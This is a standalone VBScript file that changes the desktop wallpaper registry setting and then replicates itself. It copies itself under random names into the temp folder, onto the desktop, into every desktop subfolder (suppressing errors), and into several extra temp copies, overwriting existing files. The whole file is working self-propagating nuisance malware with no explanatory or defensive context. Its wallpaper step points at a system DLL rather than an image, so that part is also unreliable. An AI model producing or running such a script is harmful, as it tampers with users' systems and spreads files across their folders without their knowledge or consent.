Option Explicit

Dim objShell, objFSO, objFolder, objFile, i

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Set wallpaper
objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(objShell.SpecialFolders("Desktop"))

' Generate a random number for the copy iteration
Randomize
Dim randomIteration
randomIteration = Int((1000 * Rnd) + 1)

' Copy the script to the temporary folder
Dim strCopyPath
strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
objFSO.CopyFile WScript.ScriptFullName, strCopyPath, True ' Add "True" to overwrite existing files

' Create a copy of the script on the desktop
Dim strDesktopCopyPath
strDesktopCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files

' Get the list of folders on the desktop
Dim colFolders, objDesktopFolder
Set objDesktopFolder = objFSO.GetFolder(objFolder.Path)
Set colFolders = objDesktopFolder.SubFolders

' Iterate through each folder and create a copy of the script
Dim objSubFolder
For Each objSubFolder In colFolders
    Dim strFolderCopyPath
    strFolderCopyPath = objSubFolder.Path & "\Copy" & randomIteration & ".vbs"
    On Error Resume Next
    objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
    On Error GoTo 0
Next

' Generate additional copies of the script
Dim numAdditionalCopies
numAdditionalCopies = 5 ' Modify the number of additional copies as desired

For i = 1 To numAdditionalCopies
    Dim additionalCopyPath
    additionalCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & "_" & i & ".vbs"
    objFSO.CopyFile strCopyPath, additionalCopyPath, True ' Add "True" to overwrite existing files
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing
